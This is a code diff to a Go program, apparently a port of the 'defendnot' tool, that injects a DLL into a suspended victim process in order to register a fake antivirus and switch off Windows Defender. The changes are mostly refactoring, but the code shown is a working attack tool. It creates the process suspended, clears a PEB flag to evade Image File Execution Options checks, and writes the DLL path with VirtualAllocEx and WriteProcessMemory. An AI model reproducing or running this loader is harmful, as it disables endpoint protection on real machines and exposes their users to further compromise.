@@ -3,16 +3,29 @@ package main
 import (
 	"flag"
 	"fmt"
+	"unsafe"
+
+	"go-defendnot/defendnot-loader/loader"
+
 	"github.com/Gr-1m/sys/windows"
 	"github.com/Gr-1m/sys/windows/extra"
-	"go-defendnot/defendnot-loader/loader"
-	"log"
-	"unsafe"
 )
 
 type PEBr1 struct {
 	InheritedAddressSpace    byte
 	ReadImageFileExecOptions byte // IFEO检测关键字段
+}
+
+func getProcessPeb(proc windows.Handle) *PEBr1 {
+	var pbi = new(windows.PROCESS_BASIC_INFORMATION)
+
+	err := windows.NtQueryInformationProcess(proc, windows.ProcessBasicInformation, unsafe.Pointer(pbi), uint32(unsafe.Sizeof(*pbi)), nil)
+	if err != nil {
+		return nil
+	}
+	peb := windows.RtlGetCurrentPeb()
+
+	return (*PEBr1)(unsafe.Pointer(peb))
 }
 
 func createSuspendedProcess(exePath string) (*windows.ProcessInformation, error) {
@@ -29,18 +42,6 @@ func createSuspendedProcess(exePath string) (*windows.ProcessInformation, error)
 	peb.ReadImageFileExecOptions = 0 // 修改PEB标志
 
 	return &pi, nil
-}
-
-func getProcessPeb(proc windows.Handle) *PEBr1 {
-	var pbi = new(windows.PROCESS_BASIC_INFORMATION)
-
-	err := windows.NtQueryInformationProcess(proc, windows.ProcessBasicInformation, unsafe.Pointer(pbi), uint32(unsafe.Sizeof(*pbi)), nil)
-	if err != nil {
-		return nil
-	}
-	peb := windows.RtlGetCurrentPeb()
-
-	return (*PEBr1)(unsafe.Pointer(peb))
 }
 
 func getLoadLibraryAddress() (uintptr, error) {
@@ -60,11 +61,10 @@ func InjectDLL(dllPath, procName string) error {
 		return fmt.Errorf("创建进程失败: %v", err)
 	}
 	defer windows.CloseHandle(pi.Thread)
-
 	fmt.Println(1)
+
 	// 2. 在目标进程分配内存
 	memAddr, err := extra.VirtualAllocEx(pi.Process, 0, uintptr(len(dllPath)+1), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-
 	if err != nil {
 		return fmt.Errorf("内存分配失败: %v", err)
 	}
@@ -73,7 +73,6 @@ func InjectDLL(dllPath, procName string) error {
 	// 3. 写入DLL路径
 	dllPathBytes := append([]byte(dllPath), 0) // 添加null终止符
 	err = windows.WriteProcessMemory(pi.Process, memAddr, &dllPathBytes[0], uintptr(len(dllPathBytes)), nil)
-
 	if err != nil {
 		return fmt.Errorf("写入内存失败: %v", err)
 	}
@@ -107,10 +106,10 @@ func main() {
 	var argsConfig = &loader.ArgsConfig{}
 	flag.StringVar(&argsConfig.Name, "n", loader.RepoUrl, "av display name")
 	flag.BoolVar(&argsConfig.Disable, "d", false, "disable defendnot")
-	//flag.Usage()
+	// flag.Usage()
 	flag.Parse()
 
 	if err := InjectDLL(loader.DllName, loader.VictimProcess); err != nil {
-		log.Fatal(err)
+		panic(err)
 	}
 }
